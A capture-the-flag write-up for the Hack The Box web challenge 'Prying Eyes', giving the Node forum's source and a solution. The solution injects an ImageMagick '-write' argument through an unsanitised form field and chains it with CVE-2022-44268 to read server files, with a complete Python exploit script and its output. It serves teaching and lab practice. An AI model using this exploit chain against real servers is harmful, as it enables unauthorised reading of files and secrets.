# Web

## Description

Welcome to the Prying Eyes, a "safe space" for those curious about the large organisations that dominate our life. How safe is the site really?

## Source

`index.js`
```js
const express = require("express");
const nunjucks = require("nunjucks");

const cookieSession = require("cookie-session");
const { randomBytes } = require("node:crypto");

const Database = require("./database");
const { render } = require("./utils");
const FlashMiddleware = require("./middleware/FlashMiddleware");
const AuthRoutes = require("./routes/auth");
const ForumRoutes = require("./routes/forum");

const app = express();
const db = new Database("./database.db");

// Set up the templating engine
const env = nunjucks.configure("views", { autoescape: true, express: app });
env.addFilter("date", (timestamp) => { const date = new Date(timestamp); return `${date.toLocaleDateString()} at ${date.toLocaleTimeString()}`; });

app.use(cookieSession({ name: "session", secret: randomBytes(69), maxAge: 24 * 60 * 60 * 1000 }));
app.use("/static", express.static("public"));
app.use(
  "/uploads",
  express.static("uploads", {
    setHeaders: (res) => { res.setHeader("Content-Type", "image/avif"); },
  })
);
app.use(express.urlencoded({ extended: false }));
app.use(FlashMiddleware);

app.get("/", function (req, res) { res.redirect("/forum"); });
app.use("/auth", AuthRoutes(db));
app.use("/forum", ForumRoutes(db));
app.use("*", (req, res) => { res.status(404); render(req, res, "error.html", { errorMessage: "We can't seem to find that page!", errorCode: "404" }); });
app.use((err, req, res, next) => { console.error(err); res.status(500); render(req, res, "error.html", { errorMessage: "Something went wrong!", errorCode: "500" }); });

(async () => {
  await db.connect();
  await db.migrate();
  app.listen(1337, "0.0.0.0", () => console.log("Listening on port 1337"));
})();
```

`routes/auth.js`
```js
const express = require("express");
const { RedirectIfAuthed } = require("../middleware/AuthMiddleware");
const ValidationMiddleware = require("../middleware/ValidationMiddleware");
const { render } = require("../utils");

const router = express.Router();
let db;

router.get("/login", RedirectIfAuthed, function (req, res) {
  render(req, res, "login.html");
});

router.post("/login", RedirectIfAuthed, ValidationMiddleware("login", "/auth/login"), async function (req, res) {
  const user = await db.loginUser(req.body.username, req.body.password);
  if (!user) {
    req.flashError("Please specify a valid username and password.");
    return res.redirect("/auth/login");
  }
  req.session = { flashes: { success: [], error: [] }, userId: user.id };
  req.flashSuccess("You are now logged in.");
  return res.redirect("/forum");
});

router.get("/register", RedirectIfAuthed, function (req, res) {
  render(req, res, "register.html");
});

router.post("/register", RedirectIfAuthed, ValidationMiddleware("register", "/auth/register"), async function (req, res) {
  const user = await db.getUserByUsername(req.body.username);
  if (user) {
    req.flashError("That username already exists.");
    return res.redirect("/auth/register");
  }
  await db.registerUser(req.body.username, req.body.password);
  req.flashSuccess("You are now registered.");
  return res.redirect("/auth/login");
});

router.get("/logout", function (req, res) {
  req.session.userId = null;
  req.flashSuccess("You have been logged out.");
  return res.redirect("/forum");
});

module.exports = (database) => { db = database; return router; };
```

`routes/forum.js`
```js
const express = require("express");
const { AuthRequired } = require("../middleware/AuthMiddleware");
const fileUpload = require("express-fileupload");
const fs = require("fs/promises");
const path = require("path");
const { convert } = require("imagemagick-convert");
const { render } = require("../utils");
const ValidationMiddleware = require("../middleware/ValidationMiddleware");
const { randomBytes } = require("node:crypto");

const router = express.Router();
let db;

router.get("/", async function (req, res) {
  render(req, res, "forum.html", { posts: await db.getPosts() });
});

router.get("/new", AuthRequired, async function (req, res) {
  render(req, res, "new.html");
});

router.get("/post/:parentId", AuthRequired, async function (req, res) {
  const { parentId } = req.params;
  const parent = await db.getPost(parentId);
  if (!parent || parent.parentId) {
    req.flashError("That post doesn't seem to exist.");
    return res.redirect("/forum");
  }
  render(req, res, "post.html", { parent, posts: await db.getThread(parentId) });
});

router.post(
  "/post",
  AuthRequired,
  fileUpload({ limits: { fileSize: 2 * 1024 * 1024 } }),
  ValidationMiddleware("post", "/forum"),
  async function (req, res) {
    const { title, message, parentId, ...convertParams } = req.body;
    if (parentId) {
      const parentPost = await db.getPost(parentId);
      if (!parentPost) {
        req.flashError("That post doesn't seem to exist.");
        return res.redirect("/forum");
      }
    }

    let attachedImage = null;

    if (req.files && req.files.image) {
      const fileName = randomBytes(16).toString("hex");
      const filePath = path.join(__dirname, "..", "uploads", fileName);

      try {
        const processedImage = await convert({
          ...convertParams,
          srcData: req.files.image.data,
          format: "AVIF",
        });

        await fs.writeFile(filePath, processedImage);

        attachedImage = `/uploads/${fileName}`;
      } catch (error) {
        req.flashError("There was an issue processing your image, please try again.");
        console.error("Error occured while processing image:", error);
        return res.redirect("/forum");
      }
    }

    const { lastID: postId } = await db.createPost(req.session.userId, parentId, title, message, attachedImage);

    if (parentId) {
      return res.redirect(`/forum/post/${parentId}#post-${postId}`);
    } else {
      return res.redirect(`/forum/post/${postId}`);
    }
  }
);

module.exports = (database) => { db = database; return router; };
```

`Dockerfile`
```bash
FROM node:18-bullseye-slim

# Install packages
RUN apt update \
    && apt install -y wget pkg-config build-essential unzip libpng-dev libjpeg-dev libavif-dev libheif-dev supervisor \
    && wget https://github.com/ImageMagick/ImageMagick/archive/refs/tags/7.1.0-33.zip -O /tmp/ImageMagick-7.1.0-33.zip \
    && cd /tmp \
    && unzip ImageMagick-7.1.0-33.zip \
    && cd ImageMagick-7.1.0-33 \
    && ./configure \
    && make -j $(nproc) \
    && make install \
    && ldconfig /usr/local/lib \
    && rm -rf /var/lib/apt/lists/* /tmp/ImageMagick-7.1.0-33

# Setup supervisor
COPY ./config/supervisord.conf /etc/supervisor/supervisord.conf

# Install node application
USER node

# Create directory
RUN mkdir /home/node/app

# Switch working directory
WORKDIR /home/node/app

# Copy challenge files
COPY --chown=node:node ./challenge/ .

# Install node dependencies
RUN npm install

# Expose Node application
EXPOSE 8000

# Switch back to root
USER root

# Start supervisord
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisor/supervisord.conf"]
```

`package.json`
```json
{
    "name": "underground-relic-forum",
    "version": "1.0.0",
    "description": "",
    "main": "index.js",
    "scripts": {
        "test": "echo \"Error: no test specified\" && exit 1",
        "dev": "nodemon ./index.js"
    },
    "keywords": [],
    "author": "JoshSH",
    "license": "ISC",
    "dependencies": {
        "ajv": "8.12.0",
        "ajv-errors": "3.0.0",
        "cookie-session": "2.0.0",
        "express": "4.18.2",
        "express-fileupload": "1.4.0",
        "imagemagick-convert": "1.0.3",
        "nunjucks": "3.2.3",
        "sqlite-async": "1.1.3"
    },
    "devDependencies": {
        "nodemon": "^2.0.20"
    }
}
```

## Solution

![prying-eyes.png](/assets/ctf/htb/web/prying-eyes.png)

No action can be done without being logged in, so let's register.

::: tip Creds
`test02:test02`
:::

Forum rules mention about purchases going through moderators and in comments we can upload images.

![prying-eyes-1.png](/assets/ctf/htb/web/prying-eyes-1.png)

In Dockerfile we see that `ImageMagick-7.1.0-33` is being installed on system, a very specific version..
```bash
&& wget https://github.com/ImageMagick/ImageMagick/archive/refs/tags/7.1.0-33.zip -O /tmp/ImageMagick-7.1.0-33.zip \
```

Searching for this version [CVE-2022-44268 Arbitrary File Read PoC - PNG generator](https://github.com/voidz0r/CVE-2022-44268)  turns up, but it says _Tested on ImageMagick v. 7.1.0-48 and 6.9.11-60_, so this might be vulnerable.

[https://github.com/kljunowsky/CVE-2022-44268](https://github.com/kljunowsky/CVE-2022-44268)

```js
router.post(
  "/post",
  AuthRequired,
  fileUpload({ limits: { fileSize: 2 * 1024 * 1024 } }),
  ValidationMiddleware("post", "/forum"),
  async function (req, res) {
    const { title, message, parentId, ...convertParams } = req.body;
    if (parentId) {
      const parentPost = await db.getPost(parentId);
      if (!parentPost) {
        req.flashError("That post doesn't seem to exist.");
        return res.redirect("/forum");
      }
    }

    let attachedImage = null;

    if (req.files && req.files.image) {
      const fileName = randomBytes(16).toString("hex");
      const filePath = path.join(__dirname, "..", "uploads", fileName);

      try {
        const processedImage = await convert({
          ...convertParams,
          srcData: req.files.image.data,
          format: "AVIF",
        });

        await fs.writeFile(filePath, processedImage);

        attachedImage = `/uploads/${fileName}`;
```

`convertParams` is taken from `req.body` and then later used in `convert` function, there doesn't seem to be any sanitization so we could sneak in some malicious param?

The uploaded image is converted to "AVIF" format, has random filename of length 32 and placed in `/uploads`.

The npm package is latest version, so unlikely that it's vulnerable: [https://www.npmjs.com/package/imagemagick-convert?activeTab=versions](https://www.npmjs.com/package/imagemagick-convert?activeTab=versions)

Looking into the source code of the function [https://github.com/izonder/imagemagick-convert/blob/master/lib/convert.js](https://github.com/izonder/imagemagick-convert/blob/master/lib/convert.js) we can observe that it uses `const {spawn} = require('child_process');` in background for conversion...

![prying-eyes-2.png](/assets/ctf/htb/web/prying-eyes-2.png)

`composeCommand` function creates the command which is executed. The code performs raw concatenation of parameters and no sanitization, so it's vulnerable to injection.
```js
    /**
     * Compose command line
     * @param {string} origin
     * @param {string} result
     * @returns {string[]}
     */
    composeCommand(origin, result) {
        const cmd = [], resize = this.resizeFactory();

        // add attributes
        for (const attribute of attributesMap) {
            const value = this.options.get(attribute);

            if (value || value === 0) {
                cmd.push(`-${attribute}`);
                if (typeof value !== 'boolean') {
                    cmd.push(`${value}`);
                }
            }
        }

        // add resizing preset
        if (resize) cmd.push(resize);

        // add in and out
        cmd.push(origin);
        cmd.push(result);

        return cmd;
    }
```

String is manipulation is sometimes too awkward to observe, we can trim down process execution and observe it in `node` interactive shell.

By default we get these arguments.
```js
> const { Converter } = require('./playground');
> (new Converter({ format: "AVIF", srcData: Buffer.from("test") })).proceed()
[
  '-density',    '600',
  '-background', 'none',
  '-gravity',    'Center',
  '-quality',    '75',
  '-',           'AVIF:-'
]
```

Looking around the source I was not able to get idea about how to inject anything into `spawn`, because it takes a list of arguments. If you pass `-l -a -h` to `ls` as arguments it's not going to work, because that's not 3 flags, but 1 string for command. Unless split, no injection.

Funnily enough the source shows that `composeCommand` returns `cmd`, but if we download the `1.0.3` tag version we see that change doesn't exist here, hence we can inject code.

![prying-eyes-3.png](/assets/ctf/htb/web/prying-eyes-3.png)

Supported flags: [https://imagemagick.org/script/convert.php](https://imagemagick.org/script/convert.php)

```bash
-write filename --------------- write images to this file
```

We can use `-write` to save the file twice, one by application and two by the convert command. Now previously mentioned CVE is valid, because we control PNG image and can get LFI.

If you get error while using `-write` double check that the file was created and it's not application just sending you errors.

```python
from io import BytesIO
from PIL import Image, PngImagePlugin
from uuid import uuid4
import readline
import requests


def decode_image(url):
    response = requests.get(url)
    with open('test.png', 'wb') as f: f.write(response.content)
    img = Image.open(BytesIO(response.content))
    profile_type = 'Not Found'
    for key, value in img.info.items():
        if 'profile' in key.lower():
            profile_type = value
            break
    profile_type = profile_type.split("\n", maxsplit=3)[3]
    profile_type_decrypted = bytes.fromhex(profile_type).decode()
    return profile_type_decrypted

def create_image(path, file_to_include):
    img = Image.new('RGBA', (200, 200), (255, 0, 0, 255))
    metadata = PngImagePlugin.PngInfo()
    metadata.add_text("profile", file_to_include)
    img.save(path, "PNG", pnginfo=metadata)

def auth(username, password):
    return locals()


if __name__ == '__main__':
    URL = 'http://83.136.249.80:31575'
    USERNAME = 'test02'
    PASSWORD = 'test02'

    output_image = "poisoned.png"
    create_image(output_image, input("File to include: "))
    # create_image(output_image, '/home/node/app/flag.txt')
    print('[+] Created image')

    with requests.Session() as session:
        resp = session.post(f'{URL}/auth/register', data=auth(USERNAME, PASSWORD))
        print('[+] Registered...')

        resp = session.post(f'{URL}/auth/login'   , data=auth(USERNAME, PASSWORD))
        print('[+] Logged...')

        with open(output_image, 'rb') as f:
            files = {
                'title': (None, str(uuid4())),
                'message': (None, str(uuid4())),
                'image': (output_image, f, 'image/png'),
                'rotate': (None, 0),
                'flip': (None, 'false'),
                'background': (None, f'none -write uploads/{output_image}')
            }
            session.post(f'{URL}/forum/post', files=files)
        print('[+] Post created')
    print(decode_image(f'{URL}/uploads/{output_image}'))
```

```bash
└─$ py pwn.py
File to include: /home/node/app/flag.txt # From Dockerfile
[+] Created image
[+] Registered...
[+] Logged...
[+] Post created
HTB{Im4g3m4g1ck_vU1n5_5tR1k3_4g4in}
```

> Flag: `HTB{Im4g3m4g1ck_vU1n5_5tR1k3_4g4in}`

